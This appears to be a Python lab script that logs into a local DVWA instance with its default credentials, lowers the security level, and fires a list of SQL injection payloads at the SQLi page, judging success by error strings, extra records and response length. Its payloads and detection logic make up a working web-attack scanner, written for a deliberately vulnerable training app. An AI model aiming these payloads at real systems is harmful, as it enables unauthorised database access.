import requests
import re

# DVWA login details
BASE_URL = "http://localhost"
LOGIN_URL = f"{BASE_URL}/login.php"
SECURITY_URL = f"{BASE_URL}/security.php"
SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli/"

# Common SQL Injection payloads to test
payloads = [
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "' OR 1=1#",
    "1 UNION SELECT null, null#"
]

# SQL error signatures that indicate vulnerability
error_signatures = [
    "sql syntax",
    "mysql_fetch",
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark"
]

def get_token(session, url):
    """Extract CSRF user_token from a DVWA page"""
    page = session.get(url)
    token = re.search(r"user_token' value='(.*?)'", page.text)
    return token.group(1) if token else ""

def login(session):
    """Login to DVWA"""
    token_value = get_token(session, LOGIN_URL)

    payload = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token_value
    }
    session.post(LOGIN_URL, data=payload)
    print("[+] Logged in to DVWA")

def set_security_level(session, level="low"):
    """Set DVWA security level for this session (low/medium/high/impossible)"""
    token_value = get_token(session, SECURITY_URL)

    payload = {
        "security": level,
        "seclev_submit": "Submit",
        "user_token": token_value
    }
    session.post(SECURITY_URL, data=payload)
    print(f"[+] Security level set to '{level}'")

def test_sqli(session):
    """Test SQL Injection payloads on the vulnerable page"""
    print("\n[*] Starting SQL Injection Scan...\n")

    # First, get baseline response (normal, non-malicious input)
    baseline = session.get(SQLI_URL, params={"id": "1", "Submit": "Submit"})
    baseline_length = len(baseline.text)

    for payload in payloads:
        params = {"id": payload, "Submit": "Submit"}
        response = session.get(SQLI_URL, params=params)

        vulnerable = False

        # Check 1: SQL error messages
        for signature in error_signatures:
            if signature.lower() in response.text.lower():
                vulnerable = True
                break

        # Check 2: Multiple user records returned (UNION-based / OR-based bypass)
        first_name_count = response.text.count("First name")
        if first_name_count > 1:
            vulnerable = True

        # Check 3: Response significantly different from baseline
        if abs(len(response.text) - baseline_length) > 100:
            vulnerable = True

        status = "\U0001F534 VULNERABLE" if vulnerable else "\U0001F7E2 Not detected"
        print(f"Payload: {payload:35} --> {status}")
        print(f"   Response length: {len(response.text)} (baseline: {baseline_length})\n")

if __name__ == "__main__":
    session = requests.Session()
    login(session)
    set_security_level(session, "low")
    test_sqli(session)